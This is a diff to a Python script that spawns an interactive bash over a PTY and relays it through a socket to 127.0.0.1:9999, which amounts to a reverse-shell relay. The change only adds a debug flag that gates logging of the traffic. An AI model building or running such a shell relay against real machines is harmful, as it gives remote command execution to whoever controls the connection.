@@ -9,6 +9,7 @@ import io
 HOST = '127.0.0.1'
 PORT = 9999
 TRANSFER_CHUNK_SIZE = 2048
+DEBUG_MODE = True
 
 
 def run_bash_pty():
@@ -19,6 +20,11 @@ def run_bash_pty():
         os.execv('/bin/bash', ('-i',))
     else:
         return fd
+
+
+def debug(*args, **kwargs):
+    if DEBUG_MODE:
+        print(*args, **kwargs)
 
 
 sock = socket.socket()
@@ -37,12 +43,12 @@ try:
             data = sock.recv(TRANSFER_CHUNK_SIZE)
 
             if len(data) > 0:
-                print("Received len: ", len(data), " Str Data: ", str(data))
+                debug("Received len: ", len(data), " Str Data: ", str(data))
                 bash_stdin.write(data)
 
         if bash_stdout in r:
             response_data = bash_stdout.read(TRANSFER_CHUNK_SIZE)
-            print("Sending (", len(response_data), "), Content: ", str(response_data))
+            debug("Sending (", len(response_data), "), Content: ", str(response_data))
             sock.send(response_data)
 
 finally:
